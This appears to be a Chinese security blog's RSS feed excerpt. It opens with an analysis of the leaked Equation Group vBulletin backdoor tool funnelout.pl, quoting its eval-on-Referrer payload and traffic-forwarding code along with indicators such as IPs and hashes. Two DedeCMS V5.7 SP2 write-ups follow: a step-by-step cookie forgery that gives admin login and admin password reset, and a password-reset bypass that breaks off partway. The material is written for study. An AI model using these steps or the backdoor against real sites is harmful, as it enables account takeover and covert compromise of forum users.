&lt;p&gt;另外如果安装过程中设置了数据库表名的前缀，那么需要修改&lt;code&gt;$DB_table&lt;/code&gt;和&lt;code&gt;$DB_datastore&lt;/code&gt;涉及sql语句的部分，例如&lt;code&gt;SELECT title FROM datastore&lt;/code&gt;修改为&lt;code&gt;SELECT title FROM $DB_datastore&lt;/code&gt;，其中&lt;code&gt;$DB_datastore&lt;/code&gt;需要自己声明。&lt;/p&gt;

&lt;p&gt;其它的可以参考说明文档，这里不再赘述。&lt;/p&gt;

&lt;h3 id=&#34;0x04-复现-分析&#34;&gt;0x04 复现&amp;amp;分析&lt;/h3&gt;

&lt;p&gt;在分析代码之前我们先了解一下&lt;code&gt;vBulletin&lt;/code&gt;的设计逻辑，特别是在模板渲染方面。&lt;/p&gt;

&lt;p&gt;程序在安装过程中会通过&lt;code&gt;includes/adminfunctions_template.php&lt;/code&gt;加载xml文件&lt;code&gt;install/vbulletin-language.xml&lt;/code&gt;，里面定义了基本的样式，根据样式的&lt;code&gt;id&lt;/code&gt;取出对应的内容插入到数据表&lt;code&gt;template&lt;/code&gt;中，渲染过程则是相反，根据模板的&lt;code&gt;title&lt;/code&gt;加载进程序，进行前端渲染，因此才能够被“无文件“安装后门，这算是论坛当初设计时一个比较明显的缺陷吧。将后门代码插入在模板中本身不容易被发现，更何况模板不以文件的方式存在而是储存在数据库中，这也为这个攻击工具提供了很好的隐蔽方式，同时也能解释脚本使用时需要指定数据库连接，因为它本身是直接对数据库进行操作的。&lt;/p&gt;

&lt;p&gt;来看一下脚本的整体功能&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TbgPz&#34; alt=&#34;funnelout.pl&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;-op&lt;/code&gt;参数展示了可以选择的操作，最主要的是&lt;code&gt;door&lt;/code&gt;,&lt;code&gt;proxy&lt;/code&gt;和&lt;code&gt;tag&lt;/code&gt;功能，以及相应的&lt;code&gt;show&lt;/code&gt;操作，我们也是选择这三部分功能进行分析&lt;/p&gt;

&lt;p&gt;因为脚本是直接对数据库进行操作，所以需要指定数据库的连接信息，也可以指定&lt;code&gt;-conf&lt;/code&gt;参数跟上论坛的配置文件，脚本会自动提取里面的基本信息。其他的参数就是字面意思，包括设置ssl，要包括及排除的用户，设置黑名单等等，可以看出脚本的功能是相当强大的。&lt;/p&gt;

&lt;h4 id=&#34;backdoor-功能分析&#34;&gt;Backdoor 功能分析&lt;/h4&gt;

&lt;p&gt;这应该是脚本最简单粗暴的方法，直接在数据库中插入后门代码，之后通过HTTP请求中的&lt;code&gt;Referrer&lt;/code&gt;字段发送指令，注意此处是&lt;code&gt;Referrer&lt;/code&gt;而不是默认的&lt;code&gt;Referer&lt;/code&gt;，隐蔽性非常好。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/uLFsU&#34; alt=&#34;backdoor&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看一下插入后门的方法(在脚本中打印了执行的sql语句来方便理解)，可以看到插入后门的操作对页脚模板插入了一段base64编码后的代码&lt;code&gt;eval($_SERVER[&amp;quot;HTTP_REFERRER&amp;quot;]);&lt;/code&gt;，在页面渲染页脚部分时就会加载恶意代码，攻击者就可以通过&lt;code&gt;HTTP_REFERRER&lt;/code&gt;字段下发指令，利用非常简单。我们来看一下它具体是如何实现的&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TPKug&#34; alt=&#34;op_door&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/J1Q9m&#34; alt=&#34;patch_db&#34; /&gt;&lt;/p&gt;

&lt;p&gt;很简单的逻辑，将base64编码后的一句话代码插入&lt;code&gt;template&lt;/code&gt;表的&lt;code&gt;footer&lt;/code&gt;模板下，在&lt;code&gt;global.php&lt;/code&gt;调用过程中被加载执行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/06Abt&#34; alt=&#34;global.php&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wSBon&#34; alt=&#34;debug&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Eumco&#34; alt=&#34;phpinfo&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;proxy-功能分析&#34;&gt;Proxy 功能分析&lt;/h4&gt;

&lt;p&gt;Proxy功能相对复杂一些，但也离不开对模板的操作，它涉及的是&lt;code&gt;header&lt;/code&gt;模板&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/gGsRT&#34; alt=&#34;proxyTemplate&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KS5ci&#34; alt=&#34;op_proxy&#34; /&gt;&lt;/p&gt;

&lt;p&gt;使用proxy时需要指定一个&lt;code&gt;tag&lt;/code&gt;，而且tagurl需要符合正则表达式&lt;code&gt;/(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/&lt;/code&gt;也就是&lt;code&gt;x.x.x.x/a/b/c/1/d/&lt;/code&gt;的格式，这地方是个坑&amp;hellip;&lt;/p&gt;

&lt;p&gt;指定tagurl生成相应的proxy代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1UrLg&#34; alt=&#34;proxy&#34; /&gt;
解码后&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oXMfY&#34; alt=&#34;proxy code&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;$fahost&lt;/code&gt;就是我们指定的tag的ip。当满足if条件——请求路径中含有&lt;code&gt;/&lt;/code&gt;且ip不是&lt;code&gt;64.38.3.50&lt;/code&gt;时，&lt;code&gt;header&lt;/code&gt;渲染过程中会加载这些php代码，构造一个请求发送给我们的tagUrl。值得注意的是这里不仅支持GET请求，同样支持POST请求，也就是说我们可以作为“中间人”的角色时刻监听着用户与论坛之间的通信，实现了真正意义上的代理，而且用户在这过程中完全无法察觉到，细思极恐&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/jEOhg&#34; alt=&#34;proxy request&#34; /&gt;&lt;/p&gt;

&lt;p&gt;可以确定的是&lt;code&gt;64.38.3.50&lt;/code&gt;这个ip一定与攻击组织有关，也许在测试的时候就将此ip排除在外，避免一些麻烦，同时这也是整个脚本泄露的唯一一个确定的ip。&lt;/p&gt;

&lt;h4 id=&#34;tag-功能分析&#34;&gt;Tag 功能分析&lt;/h4&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NXTqW&#34; alt=&#34;op_tag&#34; /&gt;
Tag功能更加复杂，操作&lt;code&gt;navbar&lt;/code&gt;模板，使用时有这么几个选项可以指定，&lt;code&gt;-tag&lt;/code&gt;指定标记的url，&lt;code&gt;-nohttp&lt;/code&gt;表示不自动加上&lt;code&gt;http://&lt;/code&gt;，这种情况可以在正常访问时嵌入一个网站本身的url，&lt;code&gt;-f&lt;/code&gt;Force，还有&lt;code&gt;ssl&lt;/code&gt;选项，适用于https的情况。&lt;/p&gt;

&lt;p&gt;我们先用&lt;code&gt;-tag&lt;/code&gt;指定一个&lt;code&gt;tag URL&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/yProo&#34; alt=&#34;tag&#34; /&gt;&lt;/p&gt;

&lt;p&gt;base64解码后的代码长这样&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kLa7C&#34; alt=&#34;tag code&#34; /&gt;&lt;/p&gt;

&lt;p&gt;当我们访问文章页面&lt;code&gt;http://127.0.0.1/vb3/showthread.php?p=1&lt;/code&gt;或访问私信链接&lt;code&gt;http://127.0.0.1/vb3/private.php?do=showpm&amp;amp;pmid=1&lt;/code&gt;时，就会加载php代码，在&lt;code&gt;datastore&lt;/code&gt;表生成一个“标签”——插入一个序列化后的&lt;code&gt;data&lt;/code&gt;字段，类似&lt;code&gt;a:2:{i:0;i:1517970003;i:1;i:1;}&lt;/code&gt;，其中最后的&lt;code&gt;i&lt;/code&gt;是一个计数器，值在随机数[0,6]之间，每次访问页面时i值递减1，当i减到0时就会触发代码，向我们设置的&lt;code&gt;tag URL&lt;/code&gt;发送用户名经过hex编码后的页面地址&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/FgW6h&#34; alt=&#34;tag code1&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pkQsP&#34; alt=&#34;61646d696e.html&#34; /&gt;
&lt;img src=&#34;http://ob5vt1k7f.qnssl.com/qmk8S&#34; alt=&#34;61646d696e req&#34; /&gt;(此处便于理解换了一个tag URL，并且新建了61646d696e.html文件)&lt;/p&gt;

&lt;p&gt;同时&lt;code&gt;tag&lt;/code&gt;减至&lt;code&gt;-1&lt;/code&gt;并出于等待重置状态，当我们进行&lt;code&gt;reset&lt;/code&gt;操作时就会清空这条“标签”数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/0wgAc&#34; alt=&#34;showTagged&#34; /&gt;
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/szepl&#34; alt=&#34;reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;值得注意的是，“标签”功能只在一天内有效，超过一天后就无法触发，只能先进行重置操作&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-nohttp&lt;/code&gt;选项&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当使用&lt;code&gt;-nohttp&lt;/code&gt;时，生成url后就可以请求网站本身的路径+hex(用户名)的页面，但是这个页面不一定存在，所以一时没想明白为什么这样设置。而没有设置&lt;code&gt;-nohttp&lt;/code&gt;时可以向我们自定义地址发送请求，结合脚本的功能推测是给访问某些特定页面的用户做一个标记，便于以后再定向攻击。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-crumb&lt;/code&gt;选项&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;指定了&lt;code&gt;-crumb&lt;/code&gt;选项后则是在页面嵌入一张1x1的图片，加载的是&lt;code&gt;images/&lt;/code&gt;目录下的&lt;code&gt;hex(用户名).gif&lt;/code&gt;，属性设置为不可见，这块的功能也没有理解透彻，总之会传递一个用户名信息，用户不知不觉中就被标记上了，细思极恐again&amp;hellip;&lt;/p&gt;

&lt;h3 id=&#34;0x05-特征&#34;&gt;0x05 特征&lt;/h3&gt;

&lt;p&gt;截图中也注意到了两个特殊的md5&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;84b8026b3f5e6dcfb29e82e0b0b0f386 Unregistered (EN)
e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这也是攻击脚本中硬编码的“黑名单”，或许理解为“白名单”更合适？&lt;/p&gt;

&lt;p&gt;另外有几个ip段，地理位置分布在各个国家&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&#39;/^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|79.173.|85.159.|94.249.|86.108.)/&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而根据另一个特殊的字符串&lt;code&gt;l9ed39e2fea93e5&lt;/code&gt;搜索，发现网上存在可能被攻击的案例，里面出现了一个域名&lt;code&gt;http://technology-revealed.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OFkMN&#34; alt=&#34;technology-revealed&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这几条线索之间的关系不得而知，或许对威胁情报能起到一起参考作用，虽然这个APT攻击已经过去好多年了。&lt;/p&gt;

&lt;h3 id=&#34;0x06-总结&#34;&gt;0x06 总结&lt;/h3&gt;

&lt;p&gt;方程式泄露的工具包对整个世界带来了巨大的影响，像“永恒之蓝”甚至成为了目前勒索病毒和挖矿木马的标配，而这个针对vb论坛的攻击工具仅仅是里面的一个文件，整个工具包里还隐藏着什么威力巨大的武器，真值得我们好好研究。单从&lt;code&gt;funnelout.v4.1.0.1.pl&lt;/code&gt;这个脚本看虽然它的利用面可能没那么广了，但作者的思维角度和攻击方法依旧没有过时，值得学习。&lt;/p&gt;

&lt;h3 id=&#34;0x07-参考&#34;&gt;0x07 参考&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://paper.seebug.org/517/&#34;&gt;https://paper.seebug.org/517/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/x0rz/EQGRP&#34;&gt;https://github.com/x0rz/EQGRP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime&#34;&gt;https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7 SP2 第二处缺陷可重置管理员密码</title>
      <link>https://kylingit.com/blog/dedecms-v5.7-sp2-%E7%AC%AC%E4%BA%8C%E5%A4%84%E7%BC%BA%E9%99%B7%E5%8F%AF%E9%87%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</link>
      <pubDate>Fri, 19 Jan 2018 15:20:32 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/dedecms-v5.7-sp2-%E7%AC%AC%E4%BA%8C%E5%A4%84%E7%BC%BA%E9%99%B7%E5%8F%AF%E9%87%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h3 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h3&gt;

&lt;p&gt;上回分析的dede重置密码漏洞有一定局限性，一是只能影响没有设置密保问题的用户，二是不能重置管理员admin的密码，原因当时也说了，管理员信息存在另一个表&lt;code&gt;dede_admin&lt;/code&gt;中，而且管理员默认不允许从前台登录，所以就算更改了&lt;code&gt;dede_member&lt;/code&gt;里&lt;code&gt;admin&lt;/code&gt;的密码也没法登录。但是前几天又有一个缺陷被爆出来，可以绕过一些判断条件从而从前台登录管理员账户，配合上一个重置密码漏洞，可以达到从前台修改&lt;code&gt;dede_admin&lt;/code&gt;表里是密码，也就是真正修改了管理员密码。&lt;/p&gt;

&lt;p&gt;下面来简单分析一下&lt;/p&gt;

&lt;h3 id=&#34;0x02-漏洞分析&#34;&gt;0x02 漏洞分析&lt;/h3&gt;

&lt;p&gt;先来看一下DedeCMS判断登录用户的逻辑
&lt;code&gt;include/memberlogin.class.php:292&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;function IsLogin()
{
    if($this-&amp;gt;M_ID &amp;gt; 0) return TRUE;
    else return FALSE;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;跟进&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;看一下，170行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$this-&amp;gt;M_ID = $this-&amp;gt;GetNum(GetCookie(&amp;quot;DedeUserID&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;GetNum()&lt;code&gt;include/memberlogin.class.php:398&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/**
*  获取整数值
*
* @access    public
* @param     string  $fnum  处理的数值
* @return    string
*/
function GetNum($fnum){
    $fnum = preg_replace(&amp;quot;/[^0-9\.]/&amp;quot;, &#39;&#39;, $fnum);
    return $fnum;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;正则匹配，去除了数字以外的字符，这里就可以构造一个利用点，一会儿再看&lt;/p&gt;

&lt;p&gt;看一下&lt;code&gt;GetCookie()&lt;/code&gt;
&lt;code&gt;include/helpers/cookie.helper.php:54&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/IO7Rf&#34; alt=&#34;GetCookie&#34; /&gt;&lt;/p&gt;

&lt;p&gt;关键点在这个判断条件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if($_COOKIE[$key.&#39;__ckMd5&#39;] != substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;就是说从cookie中取到&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;值，与&lt;code&gt;md5($cfg_cookie_encode.$_COOKIE[$key])&lt;/code&gt;取前16位比较，相等才能进行下一步&lt;/p&gt;

&lt;p&gt;我们知道admin的&lt;code&gt;DedeUserID&lt;/code&gt;为1，现在需要知道&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值&lt;/p&gt;

&lt;p&gt;其实再思考一下，就算我们不知道admin的&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;值，只要能过这个if条件就能绕过接着往下走了，那我们可不可以利用其他用户来绕过if条件呢？&lt;/p&gt;

&lt;p&gt;在本程序中从数据库取用户的过程其实很简单，就是简单的查询语句&lt;code&gt;Select * From #@__member where mid=&#39;$mid&#39;&lt;/code&gt;。当我们利用其他用户的cookie通过了上面的if判断，然后修改mid为admin的id(1)，就可以从前台登录到admin账户。
那么如何在请求过程中修改&lt;code&gt;DedeUserID&lt;/code&gt;的值让它能和admin的id相等呢？&lt;/p&gt;

&lt;h4 id=&#34;利用点一&#34;&gt;利用点一&lt;/h4&gt;

&lt;p&gt;我们使进入&lt;code&gt;GetNum&lt;/code&gt;方法的参数为&lt;code&gt;数字1+字母&lt;/code&gt;的形式，经过正则替换就会变成&lt;code&gt;1&lt;/code&gt;，也就是&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;的值，然后带入数据库查询&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/4zlB8&#34; alt=&#34;GetNum&#34; /&gt;
&lt;code&gt;$fnum&lt;/code&gt;为&lt;code&gt;1qqqq&lt;/code&gt;的情况，经过正则替换后值成为了1&lt;/p&gt;

&lt;h4 id=&#34;利用点二&#34;&gt;利用点二&lt;/h4&gt;

&lt;p&gt;在&lt;code&gt;include/memberlogin.class.php:178&lt;/code&gt;有这么一行代码&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$this-&amp;gt;M_ID = intval($this-&amp;gt;M_ID);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对&lt;code&gt;$this-&amp;gt;M_ID&lt;/code&gt;进行了整数类型转换，假设注册一个用户名，经过&lt;code&gt;intval&lt;/code&gt;转换后为&lt;code&gt;1&lt;/code&gt;就能使查询条件变成&lt;code&gt;Select * From #@__member where mid=&#39;1&#39;&lt;/code&gt;，也就取出了管理员在&lt;code&gt;dede_member&lt;/code&gt;表里的密码，此时配合上一个漏洞，我们已经修改了&lt;code&gt;dede_member&lt;/code&gt;中管理员的密码，只要在前台再进行一次修改密码操作，就能真正修改admin的密码。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Av52c&#34; alt=&#34;intval&#34; /&gt;
这是调试的时候注册用户名为&lt;code&gt;0000001&lt;/code&gt;的情况，经过&lt;code&gt;intval&lt;/code&gt;转换后&lt;code&gt;M_ID&lt;/code&gt;的值变成了1&lt;/p&gt;

&lt;p&gt;下面看一下如何从前台登录admin账户&lt;/p&gt;

&lt;p&gt;在&lt;code&gt;index.php&lt;/code&gt;里有一个&lt;code&gt;最近访客记录&lt;/code&gt;的功能，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;else
{
    require_once(DEDEMEMBER.&#39;/inc/config_space.php&#39;);
    if($action == &#39;&#39;)
    {
        include_once(DEDEINC.&amp;quot;/channelunit.func.php&amp;quot;);
        $dpl = new DedeTemplate();
        $tplfile = DEDEMEMBER.&amp;quot;/space/{$_vars[&#39;spacestyle&#39;]}/index.htm&amp;quot;;

        //更新最近访客记录及站点统计记录
        $vtime = time();
        $last_vtime = GetCookie(&#39;last_vtime&#39;);
        $last_vid = GetCookie(&#39;last_vid&#39;);
        if(empty($last_vtime))
        {
            $last_vtime = 0;
        }
        if($vtime - $last_vtime &amp;gt; 3600 || !preg_match(&#39;#,&#39;.$uid.&#39;,#i&#39;, &#39;,&#39;.$last_vid.&#39;,&#39;) )
        {
            if($last_vid!=&#39;&#39;)
            {
                $last_vids = explode(&#39;,&#39;,$last_vid);
                $i = 0;
                $last_vid = $uid;
                foreach($last_vids as $lsid)
                {
                    if($i&amp;gt;10)
                    {
                        break;
                    }
                    else if($lsid != $uid)
                    {
                        $i++;
                        $last_vid .= &#39;,&#39;.$last_vid;
                    }
                }
            }
            else
            {
                $last_vid = $uid;
            }
            PutCookie(&#39;last_vtime&#39;, $vtime, 3600*24, &#39;/&#39;);
            PutCookie(&#39;last_vid&#39;, $last_vid, 3600*24, &#39;/&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;else条件是当访问页面&lt;code&gt;http://127.0.0.1/dedecms/uploads/member/index.php?uid=1111&lt;/code&gt;传入的uid不为空时进入&lt;/p&gt;

&lt;p&gt;当我们传入的&lt;code&gt;last_vid&lt;/code&gt;为空的时候，&lt;code&gt;$last_vid = $uid;&lt;/code&gt;而&lt;code&gt;uid&lt;/code&gt;是我们能控制的，所以我们就能控制传给&lt;code&gt;PutCookie&lt;/code&gt;的参数，进入&lt;code&gt;PutCookie&lt;/code&gt;方法&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;if ( ! function_exists(&#39;PutCookie&#39;))
{
    function PutCookie($key, $value, $kptime=0, $pa=&amp;quot;/&amp;quot;)
    {
        global $cfg_cookie_encode,$cfg_domain_cookie;
        setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
        setcookie($key.&#39;__ckMd5&#39;, substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在这里设置了&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值&lt;/p&gt;

&lt;p&gt;所以攻击流程已经明确了&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;注册一个普通用户，用户名满足&lt;code&gt;数字1+字母&lt;/code&gt;的形式，或者经过&lt;code&gt;intval()&lt;/code&gt;后值为&lt;code&gt;1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;访问用户主页，记录cookie中&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值&lt;/li&gt;
&lt;li&gt;访问index页面，替换cookie中&lt;code&gt;DedeUserID&lt;/code&gt;和&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值，替换成我们注册的用户名和&lt;code&gt;last_vid__ckMd5&lt;/code&gt;，就能登录到前台admin&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x03-漏洞利用&#34;&gt;0x03 漏洞利用&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;前台注册普通用户，这里注册一个&lt;code&gt;1qqqq&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;访问&lt;code&gt;/member/index.php?uid=1qqqq&lt;/code&gt;，获取&lt;code&gt;last_vid__ckMd5&lt;/code&gt;的值
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/2izw4&#34; alt=&#34;uid&#34; /&gt;&lt;/li&gt;
&lt;li&gt;访问&lt;code&gt;/member/index.php&lt;/code&gt;，替换&lt;code&gt;DedeUserID&lt;/code&gt;和&lt;code&gt;DedeUserID__ckMd5&lt;/code&gt;的值
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/3uAj1&#34; alt=&#34;admin&#34; /&gt;
可以发现以admin身份成功登录到了前台
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/aGGc5&#34; alt=&#34;admin&#34; /&gt;&lt;/li&gt;
&lt;li&gt;同样的，修改密码访问&lt;code&gt;member/edit_baseinfo.php&lt;/code&gt;，还是要修改cookie值
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OacVb&#34; alt=&#34;reset passwd&#34; /&gt;
原登录密码就是我们利用上一个漏洞修改的密码，也就是&lt;code&gt;dede_member&lt;/code&gt;表中的admin密码，这样就达到了真正修改admin的密码
&lt;img src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OUrvR&#34; alt=&#34;reset admin passwd&#34; /&gt;
更新数据库的时候判断如果是管理员，就更新admin表中的数据&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h3&gt;

&lt;p&gt;还是判断不够严谨，这回有两处可导致判断条件的绕过，有时候一个漏洞影响力有限的时候也不能轻视，往往配合另一处缺陷就可以造成很大的危害&lt;/p&gt;

&lt;p&gt;参考：
- &lt;a href=&#34;https://xianzhi.aliyun.com/forum/topic/1961&#34;&gt;https://xianzhi.aliyun.com/forum/topic/1961&lt;/a&gt;
- &lt;a href=&#34;https://xianzhi.aliyun.com/forum/topic/1959&#34;&gt;https://xianzhi.aliyun.com/forum/topic/1959&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7 SP2 前台任意用户密码重置漏洞分析</title>
      <link>https://kylingit.com/blog/dedecms-v5.7-sp2-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
      <pubDate>Thu, 11 Jan 2018 14:12:17 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/dedecms-v5.7-sp2-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
      <description>

&lt;script src=&#34;https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;h4 id=&#34;0x01-概述&#34;&gt;0x01 概述&lt;/h4&gt;

&lt;p&gt;DEDECMS在2018-01-09更新了V5.7 SP2正式版，然后在&lt;a href=&#34;https://www.seebug.org/vuldb/ssvid-97074&#34;&gt;seebug&lt;/a&gt;有人提交存在前台任意用户密码修改漏洞。下面简单分析一下。&lt;/p&gt;

&lt;h4 id=&#34;0x02-影响版本&#34;&gt;0x02 影响版本&lt;/h4&gt;

&lt;p&gt;2018-01-09及之前的版本&lt;/p&gt;

&lt;h4 id=&#34;0x03-漏洞分析&#34;&gt;0x03 漏洞分析&lt;/h4&gt;

&lt;p&gt;问题出现在&lt;code&gt;member/resetpassword.php&lt;/code&gt;75行:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;else if($dopost == &amp;quot;safequestion&amp;quot;)
{
    $mid = preg_replace(&amp;quot;#[^0-9]#&amp;quot;, &amp;quot;&amp;quot;, $id);
    $sql = &amp;quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#39;$mid&#39;&amp;quot;;
    $row = $db-&amp;gt;GetOne($sql);
    if(empty($safequestion)) $safequestion = &#39;&#39;;

    if(empty($safeanswer)) $safeanswer = &#39;&#39;;

    if($row[&#39;safequestion&#39;] == $safequestion &amp;amp;&amp;amp; $row[&#39;safeanswer&#39;] == $safeanswer)
    {
        sn($mid, $row[&#39;userid&#39;], $row[&#39;email&#39;], &#39;N&#39;);
        exit();
    }
    else
    {
        ShowMsg(&amp;quot;对不起，您的安全问题或答案回答错误&amp;quot;,&amp;quot;-1&amp;quot;);
        exit();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重置密码的时候需要进入&lt;code&gt;sn&lt;/code&gt;函数，在这之前进行if判断&lt;code&gt;if($row[&#39;safequestion&#39;] == $safequestion &amp;amp;&amp;amp; $row[&#39;safeanswer&#39;] == $safeanswer)&lt;/code&gt;
当用户没有设置安全问题和答案时&lt;code&gt;$row[&#39;safeanswer&#39;]&lt;/code&gt;为&lt;code&gt;0&lt;/code&gt;，后面一个条件成立，所以只要前面&lt;code&gt;$row[&#39;safequestion&#39;] == $safequestion&lt;/code&gt;成立就可以进入&lt;code&gt;sn&lt;/code&gt;函数&lt;/p&gt;

